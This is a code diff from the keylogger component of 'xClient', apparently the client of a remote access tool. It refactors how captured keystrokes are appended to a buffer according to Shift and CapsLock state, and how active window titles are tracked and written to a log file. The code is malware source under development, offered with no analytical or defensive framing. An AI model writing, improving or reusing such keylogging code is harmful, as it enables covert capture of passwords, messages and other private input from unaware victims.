@@ -79,7 +79,7 @@ namespace xClient.Core.Keylogger
         public Logger(double flushInterval)
         {
             Instance = this;
-            _hWndLastTitle = "";
+            _hWndLastTitle = string.Empty;
 
             WriteFile();
 
@@ -170,20 +170,20 @@ namespace xClient.Core.Keylogger
                         if (ShiftKey && CapsLock) //If the state of Shiftkey is down and Capslock is toggled on
                         {
                             _keyBuffer.Append(FromKeys(i, true, true));
-                            return;
                         }
-                        if (ShiftKey) //If only the Shiftkey is pressed
+                        else if (ShiftKey) //If only the Shiftkey is pressed
                         {
                             _keyBuffer.Append(FromKeys(i, true, false));
-                            return;
                         }
-                        if (CapsLock) //If only Capslock is toggled on
+                        else if (CapsLock) //If only Capslock is toggled on
                         {
                             _keyBuffer.Append(FromKeys(i, false, true));
-                            return;
+                        }
+                        else
+                        {
+                            _keyBuffer.Append(FromKeys(i, false, false));
                         }
 
-                        _keyBuffer.Append(FromKeys(i, false, false));
                         return;
                     }
                 }
@@ -225,7 +225,7 @@ namespace xClient.Core.Keylogger
                                 if (string.IsNullOrEmpty(_keyBuffer.ToString()))
                                     sw.Write(_keyBuffer);
 
-                                _hWndLastTitle = "";
+                                _hWndLastTitle = string.Empty;
                             }
                             else
                                 sw.Write(_keyBuffer);
@@ -251,7 +251,7 @@ namespace xClient.Core.Keylogger
 
             string title = sbTitle.ToString();
 
-            return title != "" ? title : null;
+            return title != string.Empty ? title : null;
         }
 
         private IntPtr GetActiveKeyboardLayout()
